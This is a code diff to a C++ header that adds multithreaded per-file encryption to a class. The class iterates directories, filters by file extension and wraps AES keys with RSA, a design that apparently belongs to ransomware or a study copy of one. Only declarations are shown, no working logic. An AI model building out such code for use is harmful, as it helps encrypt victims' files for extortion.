@@ -10,6 +10,7 @@
 #include "directoryIterator.h"
 #include "fileExtensions.h"
 #include "params.h"
+#include "fileEncryptor.h"
 
 namespace butterfly
 {
@@ -27,6 +28,7 @@ private:
     int _keySize;
     bool _aesKeyInit;
     std::string _aesKeyDBPath;
+    std::vector<std::thread> _threads;
 
     std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
     std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
@@ -82,6 +84,17 @@ public:
      */
     void encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const std::string &filename);
 
+    /**
+     * Spawns a new Thread for encrypting the file
+     *
+     * @param filepath: path to the file
+     */
+    void spawnThread(const std::string &filepath);
+
+    /**
+     *
+     */
+    void joinThreads();
 };
 
 } // namespace hybrid
